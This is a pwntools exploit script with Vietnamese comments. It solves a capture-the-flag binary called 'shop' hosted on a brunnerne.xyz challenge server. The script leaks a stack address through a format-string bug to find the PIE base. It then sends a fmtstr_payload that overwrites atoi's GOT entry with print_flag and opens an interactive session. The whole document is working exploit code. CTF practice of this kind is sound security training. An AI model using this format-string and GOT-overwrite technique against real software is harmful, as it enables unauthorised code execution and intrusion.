from pwn import *

# Cấu hình file binary
elf = context.binary = ELF('./shop', checksec=False) 

# Thông tin kết nối
HOST = 'the-ingredient-shop-664dd2720735a785.challs.brunnerne.xyz'
PORT = 443

p = remote(HOST, PORT, ssl=True)

# =============================================================================
# GIAI ĐOẠN 1: LEAK ĐỊA CHỈ ĐỂ TÍNH PIE BASE
# =============================================================================

# Dựa trên kết quả quét, offset 43 là offset chính xác để leak địa chỉ PIE
RIP_OFFSET = 43
leak_payload = f'%{RIP_OFFSET}$p'.encode()
log.info(f"Sending leak payload using confirmed offset: {leak_payload}")

p.sendlineafter(b'3) exit\n', leak_payload)

p.recvuntil(b'here is your choice\n')
leaked_main_ret_addr = int(p.recvline().strip(), 16)
log.success(f"Leaked return address (in main): {hex(leaked_main_ret_addr)}")

# =============================================================================
# TÍNH TOÁN CÁC ĐỊA CHỈ CẦN THIẾT
# =============================================================================

# Tính PIE base. Offset của main+9 vẫn là 0x1351
elf.address = leaked_main_ret_addr - 0x1351
log.success(f"Calculated PIE base address: {hex(elf.address)}")

# Lấy địa chỉ runtime của các hàm
atoi_got_addr = elf.got.atoi
print_flag_addr = elf.symbols.print_flag
log.info(f"Target address (atoi@got): {hex(atoi_got_addr)}")
log.info(f"Value to write (print_flag address): {hex(print_flag_addr)}")

# =============================================================================
# GIAI ĐOẠN 2: GHI ĐÈ BẢNG GOT
# =============================================================================

# Offset payload vẫn là 8
PAYLOAD_OFFSET = 8
writes = {atoi_got_addr: print_flag_addr}
overwrite_payload = fmtstr_payload(PAYLOAD_OFFSET, writes)
log.info("Sending GOT overwrite payload...")

p.sendlineafter(b'3) exit\n', overwrite_payload)

# =============================================================================
# NHẬN SHELL
# =============================================================================
log.success("Payload sent! The GOT has been poisoned. Waiting for the shell...")
p.interactive()